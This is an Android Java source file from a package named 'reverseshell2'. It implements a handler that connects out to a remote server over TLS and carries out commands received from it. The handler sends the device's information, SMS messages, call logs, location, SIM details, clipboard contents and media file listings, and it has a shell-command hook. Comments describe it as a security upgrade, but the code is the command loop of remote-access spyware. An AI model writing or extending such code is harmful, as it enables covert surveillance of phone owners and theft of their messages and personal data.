package com.example.reverseshell2;

import android.app.Activity;
import android.content.Context;
import android.os.AsyncTask;
import android.util.Log;

/**
 * Secure connection handler that uses TLS encryption
 * Replacement for the old tcpConnection with modern security
 */
public class SecureConnectionHandler extends AsyncTask<String, Void, Void> {
    
    private static final String TAG = "SecureConnectionHandler";
    private Activity activity;
    private Context context;
    private SecureTcpConnection secureConnection;
    
    public SecureConnectionHandler(Activity activity, Context context) {
        this.activity = activity;
        this.context = context;
        this.secureConnection = new SecureTcpConnection();
    }
    
    @Override
    protected Void doInBackground(String... params) {
        String serverIP = params[0];
        String serverPortStr = params[1];
        
        try {
            int serverPort = Integer.parseInt(serverPortStr);
            
            Log.d(TAG, "Attempting secure connection to " + serverIP + ":" + serverPort);
            
            // Attempt to connect with TLS
            if (secureConnection.connect(serverIP, serverPort)) {
                Log.d(TAG, "Secure connection established: " + secureConnection.getConnectionInfo());
                
                // Start the secure communication loop
                startSecureCommunicationLoop();
                
            } else {
                Log.e(TAG, "Failed to establish secure connection");
                // Could fall back to regular connection here if needed
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error in secure connection handler", e);
        }
        
        return null;
    }
    
    private void startSecureCommunicationLoop() {
        try {
            // Send initial device info securely
            sendDeviceInfo();
            
            // Main communication loop
            while (secureConnection.isConnected()) {
                String command = secureConnection.receiveMessage();
                
                if (command == null) {
                    Log.w(TAG, "Received null command, connection may be broken");
                    break;
                }
                
                Log.d(TAG, "Received secure command: " + command);
                
                // Process command and send response
                String response = processCommand(command);
                if (response != null) {
                    secureConnection.sendMessage(response);
                }
                
                // Small delay to avoid excessive CPU usage
                Thread.sleep(100);
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error in secure communication loop", e);
        } finally {
            secureConnection.disconnect();
        }
    }
    
    private void sendDeviceInfo() {
        try {
            functions func = new functions(activity);
            String deviceInfo = func.deviceInfo();
            secureConnection.sendMessage("DEVICE_INFO:" + deviceInfo);
            Log.d(TAG, "Device info sent securely");
        } catch (Exception e) {
            Log.e(TAG, "Failed to send device info", e);
        }
    }
    
    private String processCommand(String command) {
        try {
            // Create functions instance for command processing
            functions func = new functions(activity);
            
            // Process different command types
            if (command.startsWith("deviceInfo")) {
                return func.deviceInfo();
                
            } else if (command.startsWith("getLocation")) {
                return func.getLocation();
                
            } else if (command.startsWith("getIP")) {
                return func.getIP();
                
            } else if (command.startsWith("getSMS")) {
                String[] parts = command.split(" ");
                String type = parts.length > 1 ? parts[1] : "inbox";
                return func.getSMS(type);
                
            } else if (command.startsWith("getCallLogs")) {
                return func.getCallLogs();
                
            } else if (command.startsWith("getSimDetails")) {
                return func.getSimDetails();
                
            } else if (command.startsWith("getClipData")) {
                return func.getClipData(context);
                
            } else if (command.startsWith("getMACAddress")) {
                return func.getMACAddress();
                
            } else if (command.startsWith("vibrate")) {
                String[] parts = command.split(" ");
                int times = parts.length > 1 ? Integer.parseInt(parts[1]) : 1;
                func.vibrate(times, context);
                return "Vibration completed";
                
            } else if (command.startsWith("shell")) {
                // Handle shell commands
                return handleShellCommand(command);
                
            } else if (command.startsWith("mediaFiles")) {
                // Handle modern media file access
                return handleMediaFiles(command);
                
            } else {
                return "Unknown command: " + command;
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error processing command: " + command, e);
            return "Error: " + e.getMessage();
        }
    }
    
    private String handleShellCommand(String command) {
        // Implement shell command handling
        // This would integrate with the existing shell functionality
        return "Shell command processed";
    }
    
    private String handleMediaFiles(String command) {
        try {
            // Use modern storage manager for media access
            ModernStorageManager storageManager = new ModernStorageManager(context);
            
            String[] parts = command.split(" ");
            String mediaType = parts.length > 1 ? parts[1] : "images";
            
            var mediaFiles = storageManager.getMediaFiles(mediaType);
            
            StringBuilder result = new StringBuilder();
            result.append("Media files (").append(mediaType).append("): ").append(mediaFiles.size()).append("\n");
            
            for (var file : mediaFiles) {
                result.append(file.name).append(" (").append(file.size).append(" bytes)\n");
            }
            
            return result.toString();
            
        } catch (Exception e) {
            Log.e(TAG, "Error handling media files", e);
            return "Error accessing media files: " + e.getMessage();
        }
    }
    
    @Override
    protected void onPostExecute(Void result) {
        Log.d(TAG, "Secure connection handler completed");
    }
}